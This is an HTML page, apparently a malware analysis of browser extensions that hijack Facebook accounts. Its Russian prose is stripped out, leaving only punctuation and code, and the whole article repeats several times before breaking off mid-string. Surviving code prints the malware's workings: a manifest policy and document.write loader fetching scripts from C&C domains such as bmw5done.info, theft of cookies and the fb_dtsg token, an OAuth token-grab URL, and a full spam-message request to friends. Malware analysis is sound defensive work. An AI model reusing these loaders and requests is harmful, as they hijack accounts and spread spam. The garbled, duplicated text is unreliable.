<br>  ,    ,   C&amp;C ,     , , adeaditi.info <br>  cracks4free.info. <br> <br>         : <br> <br> <a href="https://support.mozilla.org/ru/questions/959873">support.mozilla.org/ru/questions/959873</a> <br> <a href="http://stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing">stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing</a> <br> <br> ,            .          ,  ,     ,   2011 . <br> <br>     ,          - .      Facebook          .      ,               . <br> <br>           SBAPI  DNS,       .            ,    ,        ,      .   ,  CSP  ,  ,   img-src  object-src,  ,  ,           ,        .</code> </h3> <code><code><a href=""></a>  head .  kmain.js   -  ,      .      Facebook   ,  ,     adeaditi.info/kmain.js</code>       - .   ,    Firefox   Facebook-         . <br> <br> <img src="https://habrastorage.org/files/7ef/59f/f96/7ef59ff96d4e4707bb26f8f17e74b30b.png"> <br> <i>   PremiumCodec</i> <br> <br> <img src="https://habrastorage.org/files/744/13b/341/74413b3415754639b697abd7d4ac1587.png"> <br> <i>  <code><a href=""></a> adeaditi.info/kmain.js</code></i> <br> <br>    Chrome <br>         : icon128.png, manifest.json  main.js.     ,             YouTube,      "contextMenus"   permissions.  ,        : <br> <br> <code><a href=""></a> "content_security_policy": "script-src 'self' 'unsafe-eval' bmw5done.info; object-src 'self' 'unsafe-eval'"</code> , <br> <br>    ,     CSP    https       bmw5done.info. <br> <br>      main.js <br> <br> <img src="https://habrastorage.org/files/a61/53c/b85/a6153cb858714faa879b9159ed8f0722.png"> <br> <i>    main.js</i> <br> <br>  ,        document.write(‚Äúhttps://bmw5done.info/indonesia/ld.js‚Äù) . <br> <br>         ld.js,      <a href="http://pastebin.com/JB4kcaRk"></a> .      box,   ajax- : <br> <br> <code><a href=""></a> bmw5done.info/qbrweq.js?187630.24409614317</code> <br> <br>     json,          uri,      cmd.       json      ,  ,  cmd      . ,              . <br> <br>  ld.js    localStorage   ran_before, ,    ,      1,       facebook.com. <br> <br> <img src="https://habrastorage.org/files/c2d/c2b/a25/c2dc2ba25de04865a254ceae5854fd7d.png"> <br> <i>  ld.js</i> <br> <br>     callback-    .    ,     url    ‚Äúdevtools://‚Äù,   ,     ajax-   <code><a href=""></a> bmw5done.info/qbrweq.js?</code> ,             chrome.tabs.executeScript.  callback  ,    URL  : ‚Äúchrome://chrome/extensions‚Äù , ‚Äúopera://extensions‚Äù, ‚Äúchrome://extensions/‚Äù. <br> <br>        qbrweq.js?    ,     Facebook-,      <a href="http://pastebin.com/9jeC5sVi"></a> . <br> <br>   ,        URL ‚Äúwww.facebook.com‚Äù,   ,     .   ,       <code>uiToggle wrap, uiPopover. _5ce</code> .    ,   . ,            ,    Facebook  . <br> <br> <img src="https://habrastorage.org/files/214/a11/489/214a1148916843a2aaf214ced1ec78be.png"> <br> <i>  qbrweq.js,    </i> <br> <br>    ajax-    facebook.com,      document.cookie  ,     ANTI-CSRF- ‚Äúfb_dtsg‚Äù  uid .      ,    . <br> <br> <img src="https://habrastorage.org/files/3f6/248/da0/3f6248da017d4fc392ffa68e36708d90.png"> <br> <br>     URL <code><a href="https://bmw5done.info/apostime.php"></a> bmw5done.info/apostime.php</code> ‚Äî  php-   C&amp;C  .        ,    ,     json,       : link  type.  : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "type": "aktiv" }.</code> <br>     link,      ¬´?¬ª,      20   ,        ajax-     <code><a href="https://www.googleapis.com/urlshortener/v1/url"></a> www.googleapis.com/urlshortener/v1/url</code> .     localStorage   ‚Äúfb_postlink‚Äù.           . <br> <br>      ajax-api graph.facebook.com       .    <code><a href="https://facebook.com/ajax/typeahead/place_tag_friends.php"></a> facebook.com/ajax/typeahead/place_tag_friends.php</code>  json      .  json ,        friends_fields,      20  : <br> <br> <code>‚Äú&amp;composertags_with[19]=&lt;id_  &gt;"</code> . <br> <br> <img src="https://habrastorage.org/files/341/12b/bbd/34112bbbd66646cc9e550d28a8fe5711.png"> <br> <i>              20</i> <br> <br>      veri,          friends_fields. <br> <br>    ,     msjrandom.   json,   C&amp;C,   'aktiv'   1,   post_add().          ‚Äú  ‚Äù + ‚ÄúPrivate Video‚Äù     msjrandom,      "fb_postlink".  ,       (      veri).     . <br> <br>   ,      Like,       ,        . , ,       . <br> <br>      : <br> <br> <code>uygulamaizinver(TokenUrl("517220311745087"));</code> <br> <br>   ,            Facebook-  Facebook-  id 517220311745087.  TokenUrl()   url -: <br> <br> <code><a href="https://www.facebook.com/dialog/oauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D517220311745087%26redirect_uri%3Dfbconnect"></a> www.facebook.com/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=517220311745087&amp;redirect_uri=fbconnect://success&amp;sso_key=com&amp;scope=email,publish_stream,user_likes,friends_likes,user_birthday</code> <br> <br> <img src="https://habrastorage.org/files/0c2/a59/741/0c2a5974183d49d4890fe2571d9396cc.png"> <br> <br>  <code>uygulamaizinver()</code>   ajax-,       html,    ,     action  .       <code>duzenlevegonder()</code> ,            ,       ,  <code>duzenlevegonder()</code>  . <br> <br> <img src="https://habrastorage.org/files/08d/6d9/823/08d6d982394a45fb8cb3c528e0396b82.png"> <br> <br>       Facebook       ,    ,        .        .       . <br> <br>      ,     facebook.com,       ,     <code>babasker()</code> ,      <code><a href="https://bmw5done.info/ag.php"></a> bmw5done.info/ag.php</code> .    php-,     C&amp;C,   ,       API     Facebook.    json : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "base": "facebook.com", "okan": , "foto1": "https://graph.facebook.com/", "foto2": "/picture?type=large&amp;width=150&amp;height=150", "titulli": , "friends": "jo", "friendname": "jo", "type": "aktiv","web": "po" }</code> <br> <br>      ‚Äútype‚Äù   aktiv,   ajax-   <a href="https://www.googleapis.com/urlshortener/v1/">www.googleapis.com/urlshortener/v1</a>  ,    ,     C&amp;C   ‚Äúlink‚Äù,      localStorage     "fb_postlink", ,     .     <code>qwecek()</code> ,         C&amp;C json. <br> <br>    AJAX-API Facebook <a href="https://facebook.com/ajax/chat/buddy_list.php%3F__a%3D1">facebook.com/ajax/chat/buddy_list.php?__a=1</a> <br>   id ,     Facebook-,   configList.     20     id     .   c          json    <code>benimesaj()</code> ,       : <br> <br> <code>message_batch[0][action_type]=ma-type%3Auser-generated-message&amp;message_batch[0][author]=fbid%3A&lt;id__&gt;&amp;message_batch[0][author_email]&amp;message_batch[0][coordinates]&amp;message_batch[0][timestamp_time_passed]=0&amp;message_batch[0][is_unread]=false&amp;message_batch[0][is_cleared]=false&amp;message_batch[0][is_forward]=false&amp;message_batch[0][is_filtered_content]=false&amp;message_batch[0][is_spoof_warning]=false&amp;message_batch[0][source]=source%3Achat%3Aweb&amp;message_batch[0][source_tags][0]=source%3Achat&amp;message_batch[0][body]= &amp;message_batch[0][has_attachment]=true&amp;message_batch[0][html_body]=false&amp;&amp;message_batch[0][specific_to_list][0]=fbid%3A&lt;id__online&gt;&amp;message_batch[0][specific_to_list][1]=fbid%3A&lt;id__&gt;&amp;message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%20service&amp;message_batch[0][content_attachment][app_id]=2309869772&amp;message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][final]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][user]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][favicon]=&amp;message_batch[0][content_attachment][attachment][params][title]=&lt;__online&gt;jo&amp;message_batch[0][content_attachment][attachment][params][summary]=youtube.com&amp;message_batch[0][content_attachment][attachment][params][images][0]=https://graph.facebook.com/&lt;id__online&gt;/picture?type=large&amp;width=150&amp;height=150&amp;message_batch[0][content_attachment][attachm...k_ <br> metrics][images_pending]=0&amp;message_batch[0][content_attachment][link_metrics][images_fetched]=0&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&amp;message_batch[0][content_attachment][link_metrics][images_selected]=1&amp;message_batch[0][content_attachment][link_metrics][images_considered]=1&amp;message_batch[0][content_attachment][link_metrics][images_cap]=3&amp;message_batch[0][content_attachment][link_metrics][images_type]=ranked&amp;message_batch[0][content_attachment][composer_metrics][best_image_w]=100&amp;message_batch[0][content_attachment][composer_metrics][best_image_h]=100&amp;message_batch[0][content_attachment][composer_metrics][image_selected]=0&amp;message_batch[0][content_attachment][composer_metrics][images_provided]=1&amp;message_batch[0][content_attachment][composer_metrics][images_loaded]=1&amp;message_batch[0][content_attachment][composer_metrics][images_shown]=1&amp;message_batch[0][content_attachment][composer_metrics][load_duration]=4&amp;message_batch[0][content_attachment][composer_metrics][timed_out]=0&amp;message_batch[0][content_attachment][composer_metrics][sort_order]=&amp;message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&amp;message_batch[0][ui_push_phase]=V3&amp;message_batch[0][status]=0&amp;client=mercury&amp;__user=AAA&amp;__a=1&amp;__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&amp;__req=f&amp;fb_dtsg=100004008835111&amp;ttstamp=2658172571218810680459011989&amp;__rev=1300533</code> . <br> <br>    API <a href="https://facebook.com/">facebook.com</a> /ajax/mercury/send_messages.php?__a=1        ,     ,        . <br> <br> <img src="https://habrastorage.org/files/93e/683/f1f/93e683f1f6f84abb818f02c51f85869f.png"> <br> <i>   id      </i> <br> <br>    localStorage   okanxxxxss2     + 11e4,      <code>babasker()</code>   . <br> <br>  ,              Firefox.         ,          . <br> <br> <img src="https://habrastorage.org/files/1d0/e4c/734/1d0e4c7345764b4d9427d81e55c9da38.png"> <br> <br> ,            chrome.tabs.executeScript      CSP-,     //superfish.com, //ads.panoramtech.net  <a href="http://srv1.clk-analytics.com/">srv1.clk-analytics.com</a>      head  ,   CSP   .       ,        ,   CSP facebook.com.       ,         .       img-src  object-src,   facebook.com   CSP  . <br> <br>  <br>    Chrome,  ,             -  : <br> <br>          .                    ;            - ,    . <br> <br>         ,        , ..         ,     ,      -        . ,  ,    ,   ,   -   . <br> <br>  ,    ,   C&amp;C ,     , , adeaditi.info <br>  cracks4free.info. <br> <br>         : <br> <br> <a href="https://support.mozilla.org/ru/questions/959873">support.mozilla.org/ru/questions/959873</a> <br> <a href="http://stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing">stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing</a> <br> <br> ,            .          ,  ,     ,   2011 . <br> <br>     ,          - .      Facebook          .      ,               . <br> <br>           SBAPI  DNS,       .            ,    ,        ,      .   ,  CSP  ,  ,   img-src  object-src,  ,  ,           ,        .</code> <h3> <code><code><a href=""></a>  head .  kmain.js   -  ,      .      Facebook   ,  ,     adeaditi.info/kmain.js</code>       - .   ,    Firefox   Facebook-         . <br> <br> <img src="https://habrastorage.org/files/7ef/59f/f96/7ef59ff96d4e4707bb26f8f17e74b30b.png"> <br> <i>   PremiumCodec</i> <br> <br> <img src="https://habrastorage.org/files/744/13b/341/74413b3415754639b697abd7d4ac1587.png"> <br> <i>  <code><a href=""></a> adeaditi.info/kmain.js</code></i> <br> <br>    Chrome <br>         : icon128.png, manifest.json  main.js.     ,             YouTube,      "contextMenus"   permissions.  ,        : <br> <br> <code><a href=""></a> "content_security_policy": "script-src 'self' 'unsafe-eval' bmw5done.info; object-src 'self' 'unsafe-eval'"</code> , <br> <br>    ,     CSP    https       bmw5done.info. <br> <br>      main.js <br> <br> <img src="https://habrastorage.org/files/a61/53c/b85/a6153cb858714faa879b9159ed8f0722.png"> <br> <i>    main.js</i> <br> <br>  ,        document.write(‚Äúhttps://bmw5done.info/indonesia/ld.js‚Äù) . <br> <br>         ld.js,      <a href="http://pastebin.com/JB4kcaRk"></a> .      box,   ajax- : <br> <br> <code><a href=""></a> bmw5done.info/qbrweq.js?187630.24409614317</code> <br> <br>     json,          uri,      cmd.       json      ,  ,  cmd      . ,              . <br> <br>  ld.js    localStorage   ran_before, ,    ,      1,       facebook.com. <br> <br> <img src="https://habrastorage.org/files/c2d/c2b/a25/c2dc2ba25de04865a254ceae5854fd7d.png"> <br> <i>  ld.js</i> <br> <br>     callback-    .    ,     url    ‚Äúdevtools://‚Äù,   ,     ajax-   <code><a href=""></a> bmw5done.info/qbrweq.js?</code> ,             chrome.tabs.executeScript.  callback  ,    URL  : ‚Äúchrome://chrome/extensions‚Äù , ‚Äúopera://extensions‚Äù, ‚Äúchrome://extensions/‚Äù. <br> <br>        qbrweq.js?    ,     Facebook-,      <a href="http://pastebin.com/9jeC5sVi"></a> . <br> <br>   ,        URL ‚Äúwww.facebook.com‚Äù,   ,     .   ,       <code>uiToggle wrap, uiPopover. _5ce</code> .    ,   . ,            ,    Facebook  . <br> <br> <img src="https://habrastorage.org/files/214/a11/489/214a1148916843a2aaf214ced1ec78be.png"> <br> <i>  qbrweq.js,    </i> <br> <br>    ajax-    facebook.com,      document.cookie  ,     ANTI-CSRF- ‚Äúfb_dtsg‚Äù  uid .      ,    . <br> <br> <img src="https://habrastorage.org/files/3f6/248/da0/3f6248da017d4fc392ffa68e36708d90.png"> <br> <br>     URL <code><a href="https://bmw5done.info/apostime.php"></a> bmw5done.info/apostime.php</code> ‚Äî  php-   C&amp;C  .        ,    ,     json,       : link  type.  : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "type": "aktiv" }.</code> <br>     link,      ¬´?¬ª,      20   ,        ajax-     <code><a href="https://www.googleapis.com/urlshortener/v1/url"></a> www.googleapis.com/urlshortener/v1/url</code> .     localStorage   ‚Äúfb_postlink‚Äù.           . <br> <br>      ajax-api graph.facebook.com       .    <code><a href="https://facebook.com/ajax/typeahead/place_tag_friends.php"></a> facebook.com/ajax/typeahead/place_tag_friends.php</code>  json      .  json ,        friends_fields,      20  : <br> <br> <code>‚Äú&amp;composertags_with[19]=&lt;id_  &gt;"</code> . <br> <br> <img src="https://habrastorage.org/files/341/12b/bbd/34112bbbd66646cc9e550d28a8fe5711.png"> <br> <i>              20</i> <br> <br>      veri,          friends_fields. <br> <br>    ,     msjrandom.   json,   C&amp;C,   'aktiv'   1,   post_add().          ‚Äú  ‚Äù + ‚ÄúPrivate Video‚Äù     msjrandom,      "fb_postlink".  ,       (      veri).     . <br> <br>   ,      Like,       ,        . , ,       . <br> <br>      : <br> <br> <code>uygulamaizinver(TokenUrl("517220311745087"));</code> <br> <br>   ,            Facebook-  Facebook-  id 517220311745087.  TokenUrl()   url -: <br> <br> <code><a href="https://www.facebook.com/dialog/oauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D517220311745087%26redirect_uri%3Dfbconnect"></a> www.facebook.com/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=517220311745087&amp;redirect_uri=fbconnect://success&amp;sso_key=com&amp;scope=email,publish_stream,user_likes,friends_likes,user_birthday</code> <br> <br> <img src="https://habrastorage.org/files/0c2/a59/741/0c2a5974183d49d4890fe2571d9396cc.png"> <br> <br>  <code>uygulamaizinver()</code>   ajax-,       html,    ,     action  .       <code>duzenlevegonder()</code> ,            ,       ,  <code>duzenlevegonder()</code>  . <br> <br> <img src="https://habrastorage.org/files/08d/6d9/823/08d6d982394a45fb8cb3c528e0396b82.png"> <br> <br>       Facebook       ,    ,        .        .       . <br> <br>      ,     facebook.com,       ,     <code>babasker()</code> ,      <code><a href="https://bmw5done.info/ag.php"></a> bmw5done.info/ag.php</code> .    php-,     C&amp;C,   ,       API     Facebook.    json : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "base": "facebook.com", "okan": , "foto1": "https://graph.facebook.com/", "foto2": "/picture?type=large&amp;width=150&amp;height=150", "titulli": , "friends": "jo", "friendname": "jo", "type": "aktiv","web": "po" }</code> <br> <br>      ‚Äútype‚Äù   aktiv,   ajax-   <a href="https://www.googleapis.com/urlshortener/v1/">www.googleapis.com/urlshortener/v1</a>  ,    ,     C&amp;C   ‚Äúlink‚Äù,      localStorage     "fb_postlink", ,     .     <code>qwecek()</code> ,         C&amp;C json. <br> <br>    AJAX-API Facebook <a href="https://facebook.com/ajax/chat/buddy_list.php%3F__a%3D1">facebook.com/ajax/chat/buddy_list.php?__a=1</a> <br>   id ,     Facebook-,   configList.     20     id     .   c          json    <code>benimesaj()</code> ,       : <br> <br> <code>message_batch[0][action_type]=ma-type%3Auser-generated-message&amp;message_batch[0][author]=fbid%3A&lt;id__&gt;&amp;message_batch[0][author_email]&amp;message_batch[0][coordinates]&amp;message_batch[0][timestamp_time_passed]=0&amp;message_batch[0][is_unread]=false&amp;message_batch[0][is_cleared]=false&amp;message_batch[0][is_forward]=false&amp;message_batch[0][is_filtered_content]=false&amp;message_batch[0][is_spoof_warning]=false&amp;message_batch[0][source]=source%3Achat%3Aweb&amp;message_batch[0][source_tags][0]=source%3Achat&amp;message_batch[0][body]= &amp;message_batch[0][has_attachment]=true&amp;message_batch[0][html_body]=false&amp;&amp;message_batch[0][specific_to_list][0]=fbid%3A&lt;id__online&gt;&amp;message_batch[0][specific_to_list][1]=fbid%3A&lt;id__&gt;&amp;message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%20service&amp;message_batch[0][content_attachment][app_id]=2309869772&amp;message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][final]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][user]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][favicon]=&amp;message_batch[0][content_attachment][attachment][params][title]=&lt;__online&gt;jo&amp;message_batch[0][content_attachment][attachment][params][summary]=youtube.com&amp;message_batch[0][content_attachment][attachment][params][images][0]=https://graph.facebook.com/&lt;id__online&gt;/picture?type=large&amp;width=150&amp;height=150&amp;message_batch[0][content_attachment][attachm...k_ <br> metrics][images_pending]=0&amp;message_batch[0][content_attachment][link_metrics][images_fetched]=0&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&amp;message_batch[0][content_attachment][link_metrics][images_selected]=1&amp;message_batch[0][content_attachment][link_metrics][images_considered]=1&amp;message_batch[0][content_attachment][link_metrics][images_cap]=3&amp;message_batch[0][content_attachment][link_metrics][images_type]=ranked&amp;message_batch[0][content_attachment][composer_metrics][best_image_w]=100&amp;message_batch[0][content_attachment][composer_metrics][best_image_h]=100&amp;message_batch[0][content_attachment][composer_metrics][image_selected]=0&amp;message_batch[0][content_attachment][composer_metrics][images_provided]=1&amp;message_batch[0][content_attachment][composer_metrics][images_loaded]=1&amp;message_batch[0][content_attachment][composer_metrics][images_shown]=1&amp;message_batch[0][content_attachment][composer_metrics][load_duration]=4&amp;message_batch[0][content_attachment][composer_metrics][timed_out]=0&amp;message_batch[0][content_attachment][composer_metrics][sort_order]=&amp;message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&amp;message_batch[0][ui_push_phase]=V3&amp;message_batch[0][status]=0&amp;client=mercury&amp;__user=AAA&amp;__a=1&amp;__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&amp;__req=f&amp;fb_dtsg=100004008835111&amp;ttstamp=2658172571218810680459011989&amp;__rev=1300533</code> . <br> <br>    API <a href="https://facebook.com/">facebook.com</a> /ajax/mercury/send_messages.php?__a=1        ,     ,        . <br> <br> <img src="https://habrastorage.org/files/93e/683/f1f/93e683f1f6f84abb818f02c51f85869f.png"> <br> <i>   id      </i> <br> <br>    localStorage   okanxxxxss2     + 11e4,      <code>babasker()</code>   . <br> <br>  ,              Firefox.         ,          . <br> <br> <img src="https://habrastorage.org/files/1d0/e4c/734/1d0e4c7345764b4d9427d81e55c9da38.png"> <br> <br> ,            chrome.tabs.executeScript      CSP-,     //superfish.com, //ads.panoramtech.net  <a href="http://srv1.clk-analytics.com/">srv1.clk-analytics.com</a>      head  ,   CSP   .       ,        ,   CSP facebook.com.       ,         .       img-src  object-src,   facebook.com   CSP  . <br> <br>  <br>    Chrome,  ,             -  : <br> <br>          .                    ;            - ,    . <br> <br>         ,        , ..         ,     ,      -        . ,  ,    ,   ,   -   . <br> <br>  ,    ,   C&amp;C ,     , , adeaditi.info <br>  cracks4free.info. <br> <br>         : <br> <br> <a href="https://support.mozilla.org/ru/questions/959873">support.mozilla.org/ru/questions/959873</a> <br> <a href="http://stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing">stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing</a> <br> <br> ,            .          ,  ,     ,   2011 . <br> <br>     ,          - .      Facebook          .      ,               . <br> <br>           SBAPI  DNS,       .            ,    ,        ,      .   ,  CSP  ,  ,   img-src  object-src,  ,  ,           ,        .</code> </h3> <code><code><a href=""></a>  head .  kmain.js   -  ,      .      Facebook   ,  ,     adeaditi.info/kmain.js</code>       - .   ,    Firefox   Facebook-         . <br> <br> <img src="https://habrastorage.org/files/7ef/59f/f96/7ef59ff96d4e4707bb26f8f17e74b30b.png"> <br> <i>   PremiumCodec</i> <br> <br> <img src="https://habrastorage.org/files/744/13b/341/74413b3415754639b697abd7d4ac1587.png"> <br> <i>  <code><a href=""></a> adeaditi.info/kmain.js</code></i> <br> <br>    Chrome <br>         : icon128.png, manifest.json  main.js.     ,             YouTube,      "contextMenus"   permissions.  ,        : <br> <br> <code><a href=""></a> "content_security_policy": "script-src 'self' 'unsafe-eval' bmw5done.info; object-src 'self' 'unsafe-eval'"</code> , <br> <br>    ,     CSP    https       bmw5done.info. <br> <br>      main.js <br> <br> <img src="https://habrastorage.org/files/a61/53c/b85/a6153cb858714faa879b9159ed8f0722.png"> <br> <i>    main.js</i> <br> <br>  ,        document.write(‚Äúhttps://bmw5done.info/indonesia/ld.js‚Äù) . <br> <br>         ld.js,      <a href="http://pastebin.com/JB4kcaRk"></a> .      box,   ajax- : <br> <br> <code><a href=""></a> bmw5done.info/qbrweq.js?187630.24409614317</code> <br> <br>     json,          uri,      cmd.       json      ,  ,  cmd      . ,              . <br> <br>  ld.js    localStorage   ran_before, ,    ,      1,       facebook.com. <br> <br> <img src="https://habrastorage.org/files/c2d/c2b/a25/c2dc2ba25de04865a254ceae5854fd7d.png"> <br> <i>  ld.js</i> <br> <br>     callback-    .    ,     url    ‚Äúdevtools://‚Äù,   ,     ajax-   <code><a href=""></a> bmw5done.info/qbrweq.js?</code> ,             chrome.tabs.executeScript.  callback  ,    URL  : ‚Äúchrome://chrome/extensions‚Äù , ‚Äúopera://extensions‚Äù, ‚Äúchrome://extensions/‚Äù. <br> <br>        qbrweq.js?    ,     Facebook-,      <a href="http://pastebin.com/9jeC5sVi"></a> . <br> <br>   ,        URL ‚Äúwww.facebook.com‚Äù,   ,     .   ,       <code>uiToggle wrap, uiPopover. _5ce</code> .    ,   . ,            ,    Facebook  . <br> <br> <img src="https://habrastorage.org/files/214/a11/489/214a1148916843a2aaf214ced1ec78be.png"> <br> <i>  qbrweq.js,    </i> <br> <br>    ajax-    facebook.com,      document.cookie  ,     ANTI-CSRF- ‚Äúfb_dtsg‚Äù  uid .      ,    . <br> <br> <img src="https://habrastorage.org/files/3f6/248/da0/3f6248da017d4fc392ffa68e36708d90.png"> <br> <br>     URL <code><a href="https://bmw5done.info/apostime.php"></a> bmw5done.info/apostime.php</code> ‚Äî  php-   C&amp;C  .        ,    ,     json,       : link  type.  : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "type": "aktiv" }.</code> <br>     link,      ¬´?¬ª,      20   ,        ajax-     <code><a href="https://www.googleapis.com/urlshortener/v1/url"></a> www.googleapis.com/urlshortener/v1/url</code> .     localStorage   ‚Äúfb_postlink‚Äù.           . <br> <br>      ajax-api graph.facebook.com       .    <code><a href="https://facebook.com/ajax/typeahead/place_tag_friends.php"></a> facebook.com/ajax/typeahead/place_tag_friends.php</code>  json      .  json ,        friends_fields,      20  : <br> <br> <code>‚Äú&amp;composertags_with[19]=&lt;id_  &gt;"</code> . <br> <br> <img src="https://habrastorage.org/files/341/12b/bbd/34112bbbd66646cc9e550d28a8fe5711.png"> <br> <i>              20</i> <br> <br>      veri,          friends_fields. <br> <br>    ,     msjrandom.   json,   C&amp;C,   'aktiv'   1,   post_add().          ‚Äú  ‚Äù + ‚ÄúPrivate Video‚Äù     msjrandom,      "fb_postlink".  ,       (      veri).     . <br> <br>   ,      Like,       ,        . , ,       . <br> <br>      : <br> <br> <code>uygulamaizinver(TokenUrl("517220311745087"));</code> <br> <br>   ,            Facebook-  Facebook-  id 517220311745087.  TokenUrl()   url -: <br> <br> <code><a href="https://www.facebook.com/dialog/oauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D517220311745087%26redirect_uri%3Dfbconnect"></a> www.facebook.com/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=517220311745087&amp;redirect_uri=fbconnect://success&amp;sso_key=com&amp;scope=email,publish_stream,user_likes,friends_likes,user_birthday</code> <br> <br> <img src="https://habrastorage.org/files/0c2/a59/741/0c2a5974183d49d4890fe2571d9396cc.png"> <br> <br>  <code>uygulamaizinver()</code>   ajax-,       html,    ,     action  .       <code>duzenlevegonder()</code> ,            ,       ,  <code>duzenlevegonder()</code>  . <br> <br> <img src="https://habrastorage.org/files/08d/6d9/823/08d6d982394a45fb8cb3c528e0396b82.png"> <br> <br>       Facebook       ,    ,        .        .       . <br> <br>      ,     facebook.com,       ,     <code>babasker()</code> ,      <code><a href="https://bmw5done.info/ag.php"></a> bmw5done.info/ag.php</code> .    php-,     C&amp;C,   ,       API     Facebook.    json : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "base": "facebook.com", "okan": , "foto1": "https://graph.facebook.com/", "foto2": "/picture?type=large&amp;width=150&amp;height=150", "titulli": , "friends": "jo", "friendname": "jo", "type": "aktiv","web": "po" }</code> <br> <br>      ‚Äútype‚Äù   aktiv,   ajax-   <a href="https://www.googleapis.com/urlshortener/v1/">www.googleapis.com/urlshortener/v1</a>  ,    ,     C&amp;C   ‚Äúlink‚Äù,      localStorage     "fb_postlink", ,     .     <code>qwecek()</code> ,         C&amp;C json. <br> <br>    AJAX-API Facebook <a href="https://facebook.com/ajax/chat/buddy_list.php%3F__a%3D1">facebook.com/ajax/chat/buddy_list.php?__a=1</a> <br>   id ,     Facebook-,   configList.     20     id     .   c          json    <code>benimesaj()</code> ,       : <br> <br> <code>message_batch[0][action_type]=ma-type%3Auser-generated-message&amp;message_batch[0][author]=fbid%3A&lt;id__&gt;&amp;message_batch[0][author_email]&amp;message_batch[0][coordinates]&amp;message_batch[0][timestamp_time_passed]=0&amp;message_batch[0][is_unread]=false&amp;message_batch[0][is_cleared]=false&amp;message_batch[0][is_forward]=false&amp;message_batch[0][is_filtered_content]=false&amp;message_batch[0][is_spoof_warning]=false&amp;message_batch[0][source]=source%3Achat%3Aweb&amp;message_batch[0][source_tags][0]=source%3Achat&amp;message_batch[0][body]= &amp;message_batch[0][has_attachment]=true&amp;message_batch[0][html_body]=false&amp;&amp;message_batch[0][specific_to_list][0]=fbid%3A&lt;id__online&gt;&amp;message_batch[0][specific_to_list][1]=fbid%3A&lt;id__&gt;&amp;message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%20service&amp;message_batch[0][content_attachment][app_id]=2309869772&amp;message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][final]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][user]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][favicon]=&amp;message_batch[0][content_attachment][attachment][params][title]=&lt;__online&gt;jo&amp;message_batch[0][content_attachment][attachment][params][summary]=youtube.com&amp;message_batch[0][content_attachment][attachment][params][images][0]=https://graph.facebook.com/&lt;id__online&gt;/picture?type=large&amp;width=150&amp;height=150&amp;message_batch[0][content_attachment][attachm...k_ <br> metrics][images_pending]=0&amp;message_batch[0][content_attachment][link_metrics][images_fetched]=0&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&amp;message_batch[0][content_attachment][link_metrics][images_selected]=1&amp;message_batch[0][content_attachment][link_metrics][images_considered]=1&amp;message_batch[0][content_attachment][link_metrics][images_cap]=3&amp;message_batch[0][content_attachment][link_metrics][images_type]=ranked&amp;message_batch[0][content_attachment][composer_metrics][best_image_w]=100&amp;message_batch[0][content_attachment][composer_metrics][best_image_h]=100&amp;message_batch[0][content_attachment][composer_metrics][image_selected]=0&amp;message_batch[0][content_attachment][composer_metrics][images_provided]=1&amp;message_batch[0][content_attachment][composer_metrics][images_loaded]=1&amp;message_batch[0][content_attachment][composer_metrics][images_shown]=1&amp;message_batch[0][content_attachment][composer_metrics][load_duration]=4&amp;message_batch[0][content_attachment][composer_metrics][timed_out]=0&amp;message_batch[0][content_attachment][composer_metrics][sort_order]=&amp;message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&amp;message_batch[0][ui_push_phase]=V3&amp